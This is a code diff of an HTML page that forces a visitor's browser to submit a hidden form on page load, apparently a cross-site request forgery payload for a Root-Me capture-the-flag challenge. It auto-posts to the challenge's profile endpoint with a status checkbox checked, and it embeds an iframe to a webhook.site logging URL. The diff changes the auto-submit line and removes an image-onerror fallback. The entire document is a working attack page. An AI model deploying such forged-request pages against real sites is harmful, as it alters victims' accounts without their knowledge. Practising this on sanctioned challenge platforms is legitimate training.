@@ -1,5 +1,5 @@
 <html>
-  <body onload="document.frames[0].submit()">
+  <body onload="document.forms[0].submit()">
     <form
       action="http://challenge01.root-me.org/web-client/ch22/?action=profile"
       method="post"
@@ -8,13 +8,8 @@
       enctype="multipart/form-data"
     >
       <input type="text" name="username" value="toto" />
-      <input type="checkbox" name="status" value="on" />
+      <input type="checkbox" name="status" checked />
     </form>
-
-    <img
-      src="azerty.toto"
-      onerror="document.getElementById('myform').submit();"
-    />
 
     <iframe src="https://webhook.site/306945d3-a762-4681-aa91-ec98165f7d00" />
   </body>
